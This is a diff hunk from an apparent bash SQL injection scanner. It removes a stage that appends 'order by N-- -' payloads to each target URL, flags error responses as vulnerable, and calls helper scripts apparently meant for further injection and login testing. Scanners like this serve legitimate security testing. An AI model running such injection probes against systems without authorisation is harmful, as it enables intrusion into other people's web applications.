@@ -421,38 +421,6 @@ while IFS= read -r url; do
     "$SCRIPT_DIR/sqlogin.sh" "$url" || true
   fi
 
-  # ---- Stage 3: Additional check: ORDER BY incremental testing
-  if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
-    fi
-    
-    # Test ORDER BY with increasing column numbers
-    for i in {1..20}; do
-      order_payload="%20order%20by%20${i}--%20-"
-      response_code=$(curl_cmd "${url}/${order_payload}")
-      
-      if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]] && [[ "$response_code" != "404" ]]; then
-        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-        echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
-        echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
-        vulnerable=true
-        # Mark this base URL as vulnerable to skip future variations
-        vulnerable_bases["$base_url"]=1
-        
-        # Run additional tests
-        if [[ -n "$header" ]]; then
-          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
-        else
-          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
-        fi
-        
-        "$SCRIPT_DIR/sqlogin.sh" "$url" || true
-        break
-      fi
-    done
-  fi
-
   # ---- Final safe output
   if [[ "$vulnerable" == false ]]; then
     echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
